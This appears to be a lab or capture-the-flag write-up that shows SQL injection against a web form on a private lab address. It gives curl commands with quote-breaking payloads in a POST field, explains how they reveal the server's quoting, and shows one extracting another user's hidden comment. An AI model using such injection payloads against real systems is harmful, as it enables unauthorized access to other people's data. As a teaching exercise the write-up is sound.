Steps:

(1) Post data in different format to find out how the SERVER embeds the post data for SQL query.
    Run the following 2 commands. 
    Notice that the difference is the first command is using double quotes in the post data, 
    and the second command is using single quote in the post data:

    curl -k -v -d 'picture=char-kway-teow.jpg" or "1" = "1' https://192.168.15.1/thought
    curl -k -v -d "picture=char-kway-teow.jpg' or '1' = '1" https://192.168.15.1/thought

(2) Observed the result:
  
    1) With the first command, the content doesn't contain any comments. 
    2) With the second command, the content contains Aditya's comments on three pics.

    The result indicates that the SERVER wraps the post data inside single quotes.
    That is why the second command can help us extract all of comments from Aditya.

(3) To extract Alice's comment, the SQL statement should contain a part that involes Alice in the query. 
    The SQL statement can contain an 'or' part to query comments from both Aditya and Alice.
    In terms of the idea from the previous part, we can construct the command as the following:

    curl -k -v -d "picture=char-kway-teow.jpg' or 'name' = 'alice" https://192.168.15.1/thought

    Then we can get Alice's comment from the response:

    <tr><td>alice</td><td>char-kway-teow.jpg</td><td>The best char kway teow is Penang char kway teow (lat: 5.411135 / lng: 100.330463)</td></tr>
